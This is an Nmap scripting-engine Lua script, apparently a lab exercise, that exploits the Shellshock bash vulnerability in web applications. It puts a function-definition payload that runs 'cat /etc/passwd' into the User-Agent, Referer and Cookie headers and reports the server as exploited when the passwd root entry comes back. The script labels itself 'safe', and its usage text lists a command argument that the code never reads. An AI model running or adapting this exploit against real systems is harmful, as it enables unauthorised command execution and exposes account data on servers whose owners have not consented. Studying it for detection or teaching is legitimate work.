local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local rand = require "rand"

description = [[
Attempts to exploit the "shellshock" vulnerability (CVE-2014-6271 and
CVE-2014-7169) in web applications.

To detect this vulnerability the script executes a command that show content of /etc/passwd
]]

---
-- @usage
-- nmap -sV -p- --script lab2-shellshock <target>
-- nmap -sV -p- --script lab2-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
---
categories = {"vuln", "safe"}

portrule = shortport.http

function generate_http_req(host, port, uri, custom_header)
  local cmd = "() { :;}; echo; echo; /bin/bash -c 'cat /etc/passwd'"
  -- Plant the payload in the HTTP headers
  local options = {header={}}
  options["no_cache"] = true
  if custom_header == nil then
    stdnse.debug1("Sending '%s' in HTTP headers:User-Agent,Cookie and Referer", cmd)
    options["header"]["User-Agent"] = cmd
    options["header"]["Referer"] = cmd
    options["header"]["Cookie"] = cmd
  else
    stdnse.debug1("Sending '%s' in HTTP header '%s'", cmd, custom_header)
    options["header"][custom_header] = cmd
  end
  local req = http.get(host, port, uri, options)
  return req
end

action = function(host, port)
  local http_header = stdnse.get_script_args(SCRIPT_NAME..".header") or nil
  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or '/'
  local req = generate_http_req(host, port, uri, http_header, nil)
  if req.status == 200 and req.body:find("root:x:0:0:root:/root:/bin/bash", 1, true) then
    local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
    local vuln = {
      title = 'HTTP Shellshock vulnerability',
      state = vulns.STATE.NOT_VULN,
      description = [[
This web application might be affected by the vulnerability known
as Shellshock. It seems the server is executing commands injected
via malicious HTTP headers.
      ]],
      IDS = {CVE = 'CVE-2014-6271'},
    }
    stdnse.debug1("Pattern 'root:x:0:0:root:/root:/bin/bash' found. Host seems vulnerable.")
    vuln.state = vulns.STATE.EXPLOIT
    vuln.exploit_results = req.body
    return vuln_report:make_output(vuln)
  end
end
